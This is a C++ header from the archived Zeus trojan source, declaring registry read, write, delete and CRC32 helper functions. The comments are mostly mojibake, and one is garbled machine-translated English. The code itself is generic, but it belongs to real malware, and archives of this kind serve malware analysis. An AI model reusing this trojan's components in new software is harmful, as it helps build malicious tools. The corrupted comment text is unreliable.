/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ������ � �������� Windows.
*/
#pragma once

#define REGISTRY_MAX_VALUE_DATA_SIZE (1 * 1024 * 1204)

namespace Registry
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ��������� �������� �� ������� ��� ������. ����� �������������� ������������ REG_EXPAND_SZ.

    IN key        - ����.
    IN subKey     - ������� ����� key, ���� �������� ����� NULL, �� ������������� value ���
                    �������� key.
    IN value      - ��� �������� ��� ���������.
    IN buffer     - ������.
    IN bufferSize - ������ ������ � �������� ������� ������� ������.

    Return        - ������ ������, � ��������, �������� ������� ������,
                    (DWORD)-1 - � ������ ������.
  */
  DWORD _getValueAsString(HKEY key, const LPWSTR subKey, const LPWSTR value, LPWSTR buffer, DWORD bufferSize);
  
  /*
    ��������� �������� �� ������� ��� ������.

    IN key        - ����.
    IN subKey     - ������� ����� key, ���� �������� ����� NULL, �� ������������� value ���
                    �������� key.
    IN value      - ��� �������� ��� ���������.
    IN buffer     - ������.
    IN bufferSize - �� ����� ������ ������, � �������� �������� ������� ������,

    Return        - true - � ������ ������,
                    false - � ������ ������.
  */
  bool _setValueAsString(HKEY key, const LPWSTR subKey, const LPWSTR value, const LPWSTR buffer, DWORD bufferSize);

  /*
    ��������� �������� �� ������� ��� DWORD.

    IN key    - ����.
    IN subKey - ������� ����� key, ���� �������� ����� NULL, �� ������������� value ��� ��������\
                key.
    IN value  - ��� �������� ��� ���������.

    Return    - �������� value, ��� 0 � ������ ������.
  */
  DWORD _getValueAsDword(HKEY key, const LPWSTR subKey, LPWSTR value);

  /*
    ������ �������� � ������ ��� DWORD.
  
    IN key    - ����.
    IN subKey - ������� ����� key, ���� �������� ����� NULL, �� ������������� value ��� ��������
                key.
    IN value  - ��� �������� ��� ���������.
    IN data   - ��������.

    Return    - true - � ������ ������,
                false - � ������ ������.
  */
  bool _setValueAsDword(HKEY key, const LPWSTR subKey, const LPWSTR value, DWORD data);

  /*
    ��������� �������� �� ������� ��� ������.

    IN key        - ����.
    IN subKey     - ������� ����� hKey, ���� �������� ����� NULL, �� ������������� pstrValue ���
                    �������� hKey.
    IN value      - ��� �������� ��� ���������.
    OUT type      - ��� �������� REG_*, ���� ���� NULL.
    OUT buffer    - ������ ��� ��������.
    IN bufferSize - ������ ������� pBuf.

    Return        - ������ ������, ��� (DWORD)-1 - � ������ ������.
  */
  DWORD _getValueAsBinary(HKEY key, const LPWSTR subKey, const LPWSTR value, LPDWORD type, void *buffer, DWORD bufferSize);

  /*
    ������ �������� � ������ ��� ������.
  
    IN key        - ����.
    IN subKey     - ������� ����� key, ���� �������� ����� NULL, �� ������������� value ���
                    �������� key.
    IN value      - ��� �������� ��� ���������.
    IN type       - ��� �������� REG_*, ���� ���� NULL.
    IN buffer     - ������.
    IN bufferSize - ���������� ���� ��� ������.

    Return        - true - � ������ ������,
                    false - � ������ ������.
  */
  bool _setValueAsBinary(HKEY key, const LPWSTR subKey, const LPWSTR value, DWORD type, const void *buffer, DWORD bufferSize);
    
  /*
    ��������� �������� �� ������� ��� ������ � ���������� ������.

    IN key     - ����.
    IN subKey  - ������� ����� key, ���� �������� ����� NULL, �� ������������� value ���
                 �������� key.
    IN value   - ��� �������� ��� ���������.
    OUT type   - ��� �������� REG_*, ���� ���� NULL.
    OUT buffer - ������ ��� ��������, ������ ���� ���������� ����� Mem.

    Return     - ������ ������, ��� (DWORD)-1 - � ������ ������.
  */
  DWORD _getValueAsBinaryEx(HKEY key, const LPWSTR subKey, const LPWSTR value, LPDWORD type, void **buffer);
  
  /*
    ��������� �������� �� ������� � ���� CRC32. ������� Crypt.

    IN key    - ����.
    IN subKey - ������� ����� key, ���� �������� ����� NULL, �� ������������� value ��� ��������
                key.
    IN value  - ��� �������� ��� ���������.

    Return   - CRC32, ��� 0 � ������ ������ ��� ������ ������.
  */
  DWORD _getsCrc32OfValue(HKEY key, const LPWSTR subKey, const LPWSTR value);

  /*
    �������� ����� �� ����� ����������.
    
    IN key    - ����.
    IN subKey - ������� ����� key ��� �������� (�� ����� ���� NULL).

    Return    - true - � ������ ������,
                false - � ������ ������.
  */
  bool _deleteKey(HKEY key, const LPWSTR subKey);

  /*
    �������� �������� � �������.
    
    IN key    - ����.
    IN subKey - ������� ����� key, ���� �������� ����� NULL, �� ������������� value ��� ��������
                key.
    IN value  - ��� �������� ��� ��������.

    Return    - true - � ������ ������,
                false - � ������ ������.
  */
  bool _deleteValue(HKEY key, const LPWSTR subKey, const LPWSTR value);

  /*    Checks whether the value suschtctvuet

    IN key - the key.
    IN subKey - Connect dongle key, if the value is NULL, then the requested value for the current
                key.
    IN value - the value name.

    Return - true - if successful,
                false - if an error occurs.
  */
  bool _valueExists(HKEY key, const LPWSTR subKey, const LPWSTR value);
};
